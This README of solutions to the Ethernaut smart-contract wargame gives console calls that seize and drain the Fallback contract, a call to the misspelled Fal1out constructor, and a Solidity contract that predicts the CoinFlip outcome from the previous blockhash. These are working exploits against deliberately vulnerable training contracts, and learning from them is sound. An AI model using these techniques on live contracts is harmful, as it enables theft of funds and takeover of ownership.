# ethernaut-challenges

### challenge 1
await contract.contribute({value: toWei("0.000001")})

await contract.sendTransaction({value: toWei("0.000001")})

await contract.withdraw()

### challenge 2
Constructor spelled incorrectly


await contract.Fal1out({value: toWei("0.00000001")})

### challenge 3

```
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/contracts/utils/math/SafeMath.sol";

interface CoinFlip {
    function flip(bool) external;
}

contract Attack {
    address cF = 0x30C7A39F911f075F45434357af31Ec5aaA9828bb;

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    uint256 public value;

    function attack() public returns (uint256){
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        CoinFlip(cF).flip(side);

        return blockValue;
    }
}
```
